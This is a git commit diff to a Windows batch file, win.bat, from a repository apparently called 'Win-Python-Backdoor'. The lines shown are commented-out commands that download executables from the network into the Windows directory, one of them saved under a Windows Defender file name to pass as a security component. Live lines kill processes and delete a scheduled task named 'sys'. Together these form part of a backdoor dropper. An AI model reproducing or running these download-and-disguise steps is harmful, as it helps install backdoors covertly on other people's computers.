5b58d8654fa10bba9e826eef38e3356be29cb24a
pistacchietto <pistacchietto2@gmail.com>
2019-02-01 21:33:00 +0100

    ok

--- win.bat
+++ win.bat
@@ -55,7 +55,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
-rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
+rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup.exe
 taskkill /f /im woffice.exe
 taskkill /f /im wscript.exe
 schtasks /delete /tn sys /F
